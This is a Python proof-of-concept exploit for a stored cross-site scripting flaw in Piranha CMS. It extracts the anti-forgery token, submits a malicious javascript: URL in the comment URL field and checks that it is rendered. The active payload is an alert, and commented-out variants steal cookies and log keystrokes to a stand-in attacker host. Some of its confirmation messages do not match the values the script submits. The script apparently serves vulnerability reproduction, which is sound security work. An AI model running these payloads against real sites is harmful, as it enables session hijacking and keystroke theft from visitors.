"""
repro_piranha_xss.py
Phase 6 PoC — CWE-79 Stored XSS in Piranha CMS via CommentUrl field
Vulnerability: CommentUrl is stored unsanitized and rendered inside href attribute.
javascript: protocol bypasses Razor HTML encoding -> XSS on click.

Target: POST /Post?handler=SaveComment (Razor Pages handler — RazorWeb example)
Severity: HIGH | CVSS: 8.8 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)
CWE: CWE-79 (Improper Neutralization of Input During Web Page Generation)

Usage:
    python repro_piranha_xss.py http://localhost:5000 /blogtest/test123
"""

import requests
import sys
import re

TARGET   = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
POST_SLUG = sys.argv[2] if len(sys.argv) > 2 else "/blogtest/test123"

# ------------------------------------------------------------------
# Step 1: GET the post page to extract AntiForgeryToken + Post ID
# ------------------------------------------------------------------
session = requests.Session()
r_get = session.get(f"{TARGET}{POST_SLUG}")
assert r_get.status_code == 200, f"GET failed: {r_get.status_code}"

token_match = re.search(
    r'<input[^>]+name="__RequestVerificationToken"[^>]+value="([^"]+)"',
    r_get.text
)
assert token_match, "AntiForgeryToken not found — check POST_SLUG"
csrf_token = token_match.group(1)
print(f"[+] CSRF token extracted: {csrf_token[:30]}...")

# ------------------------------------------------------------------
# Step 2: Extract post ID from hidden form field
# ------------------------------------------------------------------
id_match = re.search(r'<input[^>]+name="Id"[^>]+value="([^"]+)"', r_get.text)
assert id_match, "Post ID not found in page — check POST_SLUG"
post_id = id_match.group(1)
print(f"[+] Post ID: {post_id}")

# ------------------------------------------------------------------
# Step 3: Submit malicious comment — XSS payload in CommentUrl field
# Piranha renders: <a href="@Model.Url" target="_blank">@Model.Author</a>
# Razor HTML-encodes text content but javascript: in href executes on click.
# ------------------------------------------------------------------

# Payload 1: Simple alert — easiest to visually confirm
xss_payload = "javascript:alert('hi there')"

# Payload 2: Cookie exfil (stealth — void() prevents about:blank navigation)
# xss_payload = "javascript:void(fetch('https://attacker.example/steal?c='+document.cookie))"

# Payload 3: Keylogger (void() prevents navigation)
# xss_payload = "javascript:void((function(){document.onkeypress=function(e){fetch('https://attacker.example/keys?k='+e.key)}})())"

r_post = session.post(
    f"{TARGET}/Post?handler=SaveComment",
    data={
        "__RequestVerificationToken": csrf_token,
        "Id":            post_id,
        "CommentAuthor": "N0rM@l c0mm3nT",
        "CommentEmail":  "repro@zerkit2.local",
        "CommentUrl":    xss_payload,   # <- MALICIOUS PAYLOAD
        "CommentBody":   "This is a proof-of-concept comment for CWE-79.",
    },
    headers={"Referer": f"{TARGET}{POST_SLUG}"},
    allow_redirects=True,
)
print(f"[+] Comment POST status: {r_post.status_code}")

# ------------------------------------------------------------------
# Step 4: Verify payload is stored and rendered in page
# Note: comment must be approved first (Manager -> Comments -> Approve)
# ------------------------------------------------------------------
r_verify = session.get(f"{TARGET}{POST_SLUG}")

# Check for the raw payload (auto-approved)
if xss_payload in r_verify.text:
    print("[CRITICAL] STORED XSS CONFIRMED — payload found in rendered HTML!")
    print(f"           Payload: {xss_payload}")
    print(f"           Location: {POST_SLUG} -> <a href=\"{xss_payload}\">")
    print()
    print("=" * 60)
    print("VISUAL CONFIRMATION STEPS (To bypass Chrome block):")
    print("1. RECOMMENDED: Open the page in Firefox.")
    print(f"   URL: {TARGET}{POST_SLUG}")
    print("2. Click the 'ZeroKit2 PoC' link in the comments.")
    print("3. Alternatively (Chrome): Right-click 'ZeroKit2 PoC' -> 'Open link'.")
    print("4. Result: An alert(1) popup should appear.")
    print("=" * 60)
    sys.exit(0)

# Check HTML-encoded version (stored but pending approval or encoded)
encoded_check = "javascript:alert" in r_verify.text or "javascript:void" in r_verify.text
if encoded_check:
    print("[+] Payload found (HTML-encoded) — comment may be pending approval.")
    print("    Go to Manager -> Comments -> Approve the 'ZeroKit2 PoC' comment.")
    sys.exit(0)

print("[FAIL] Payload not found. Check:")
print("  1. Comment approval: Manager -> Comments -> Approve")
print("  2. Auto-approve: Manager -> Settings -> Comments -> Auto-approve ON")
sys.exit(1)
